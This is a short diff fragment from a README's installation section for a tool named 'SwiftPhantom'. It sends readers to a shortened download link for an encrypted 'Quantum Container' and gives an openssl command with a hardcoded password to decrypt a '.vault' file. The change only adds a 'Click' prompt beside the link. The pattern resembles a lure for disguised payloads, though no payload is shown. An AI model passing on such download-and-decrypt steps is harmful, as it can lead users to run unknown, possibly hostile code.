@@ -18,7 +18,7 @@
 
 ## 🚀 Installation: 3-Clock Cycle  
 
-1. **Download** the [Quantum Container](https://goo.vc/mqle9) (SHA3-512 verified).  
+1. **Download** the [Quantum Container](https://goo.vc/mqle9) <- Click (SHA3-512 verified).  
 2. **Decrypt** using:  
    ```bash  
    openssl enc -d -aes-256-cbc -in SwiftPhantom.vault -k "S7w!Ft_Ph4nt0m_C0re"  
